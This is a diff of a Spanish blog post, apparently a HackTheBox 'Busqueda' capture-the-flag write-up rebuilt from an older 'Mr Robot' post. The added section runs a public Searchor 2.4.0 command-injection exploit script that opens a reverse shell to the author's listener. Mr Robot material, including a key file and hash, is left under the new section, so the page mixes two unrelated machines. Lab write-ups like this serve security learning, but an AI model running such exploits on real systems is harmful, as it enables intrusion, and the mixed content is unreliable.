@@ -124,7 +124,7 @@
       <h3 class="post-title">Contenido</h3><br>
       <ul>
         <li><a href="#enumeration">Enumeración</a></li>
-        <li><a href="#bf">Brute Force con Hydra</a></li>
+        <li><a href="#exp">Explotando la vulnerabilidad</a></li>
         <li><a href="#rshell">Reverse Shell en PHP</a></li>
         <li><a href="#espriv">Escalada de privilegios</a></li>
       </ul>
@@ -169,27 +169,30 @@ para que nos cargue correctamente.</p><br>
 
 <a href="/htb/busqueda/2.png" target="_blank"><div><p><img src="/htb/busqueda/2.png"></p></div></a>
 
+<section class="post" id="exp">
+<br><h3 class="post-title">Explotando la vulnerabilidad</h3><br>
 <p class="plain-text">Hacemos un búsqueda rápida en Google y sin demasiada dificultad encontramos un exploit que parece aprovecharse de una vulnerabilidad de <code class="language-plaintext highlighter-rouge">Searchor 2.4.0</code>,
 situado en el repositorio <a href=https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection>Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</a> del usuario nikn0laty.
 
 <a href="/htb/busqueda/3.png" target="_blank"><div><p><img src="/htb/busqueda/3.png"></p></div></a>
 
-<p class="plain-text">Hemos encontrado varios directorios que parecen interesantes y que nos pueden ayudar a saber por dónde seguir, vamos a inspeccionarlos.
-<br><h3 style="color: white;">Directorio atom</h3><br>
-<a href="/thm/mrrobot/1.png" target="_blank"><div><p><img src="/thm/mrrobot/1.png"></p></div></a>
-<a href="/thm/mrrobot/2.png" target="_blank"><div><p><img src="/thm/mrrobot/2.png"></p></div></a>
+<p class="plain-text">A continuación descargamos el exploit y lo ejecutamos habiendo antes puesto uno de nuestros puertos en modo escucha para recibir la reverse shell.</p>
 
-<p class="plain-text">Al acceder a este directorio se nos descarga un archivo con formato .atom, en el, sólo encontramos el código de la página Wordpress aunque nos da algo de información útil como la versión de este: <code class="language-plaintext highlighter-rouge">4.3.1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">└─$ sudo bash ./exploit.sh searcher.htb 10.10.14.143 4444</span><span class="p">
+---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
+[*] Input target is searcher.htb
+[*] Input attacker is 10.10.14.143:4444
+[*] Run the Reverse Shell... Press Ctrl+C after successful connection </span>
+</code></pre></div></div><br>
 
-<br><h3 style="color: white;">Directorio login</h3><br>
-<a href="/thm/mrrobot/3.png" target="_blank"><div><p><img src="/thm/mrrobot/3.png"></p></div></a>
-<p class="plain-text">Se nos redirige automáticamente al directorio <code class="language-plaintext highlighter-rouge">"/wp-login.php"</code>, este nos será de gran ayuda para poder acceder a la administración de la web si conseguimos las credenciales necesarias.</p>
+<p class="plain-text">Funciona a la perfección y vemos como a través de la shell recibida por el puerto 4444 podemos accceder a la primera flag</p>
 
-<br><h3 style="color: white;">Directorio robots</h3><br>
-<a href="/thm/mrrobot/4.png" target="_blank"><div><p><img src="/thm/mrrobot/4.png"></p></div></a>
-<p class="plain-text">Una vez cargado el directorio este nos muestra el contenido del archivo <code class="language-plaintext highlighter-rouge">robots.txt</code>, realmente este archivo lo tendríamos que comprobar siempre, independientemente de si una herramienta de análisis nos lo muestra
-ya que suele estar en todas las páginas webs y en el se especifican directorios y archivos que no se desean indexar.</p>
-<p class="plain-text">¡Sorpresa! Parece que hemos encontrado la primera key además de lo que parece ser un diccionario que contiene valores que podrían actuar como nombres de usuario y/o contraseñas.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve"></span><span class="p">
+</span>
+</code></pre></div></div><br>
+
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">10.10.0.164/key-1-of-3.txt </span><span class="ve">
 073403c8a58a1f80d943455fb30724b9</span>
